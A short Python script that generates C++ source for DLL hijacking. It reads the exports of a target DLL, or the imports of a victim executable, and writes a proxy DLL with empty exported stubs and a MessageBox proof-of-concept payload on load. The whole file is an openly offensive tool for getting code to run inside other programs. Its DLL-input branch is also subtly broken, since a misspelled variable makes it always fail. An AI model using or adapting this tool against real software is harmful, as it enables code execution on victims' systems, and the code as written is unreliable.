#!/usr/bin/env python3

import os
import sys
import time
import pefile

def get_symbols_dll(filename):
    pe    = pefile.PE(filename)
    names = []

    for sym in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        names.append(sym.name.decode('latin1'))

    return names

def get_symbols_pe(filename, dllname):
    pe    = pefile.PE(filename)
    names = []

    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        if entry.dll.decode('latin1') != dllname:
            continue

        for imp in entry.imports:
            names.append(imp.name.decode('latin1'))

    return names

def generate(filename, symbols):
    template = '''
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        MessageBoxA(NULL, "OK", "OK", MB_OK);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
'''

    exports = []
    for name in symbols:
        exports.append('extern "C" __declspec(dllexport) void %s() {}' % (name))

    with open(filename, 'w+') as f:
        f.write(template + '\n'.join(exports) + '\n')

def usage():
    print (f'''
Generate DLL hijack source code

To create source code from dll file:
{sys.argv[0]} target.dll

To create source code from exe only:
{sys.argv[0]} victim.exe target.dll
''')

    sys.exit(0)

if __name__ == '__main__':
    symbols  = []
    filename = ''

    if len(sys.argv) == 1:
        usage()

    if sys.argv[1].endswith('.dll'):
        filename = os.path.basename(sys.argv[1]) + '.cpp'
        symbol   = get_symbols_dll(sys.argv[1]) 
    elif sys.argv[1].endswith('.exe'):
        if len(sys.argv) != 3:
            usage()

        filename = os.path.basename(sys.argv[2]) + '.cpp'
        symbols  = get_symbols_pe(sys.argv[1], sys.argv[2])

    if not symbols:
        raise Exception('no symbols loaded')

    generate(filename, symbols)
    print('Wrote', filename)
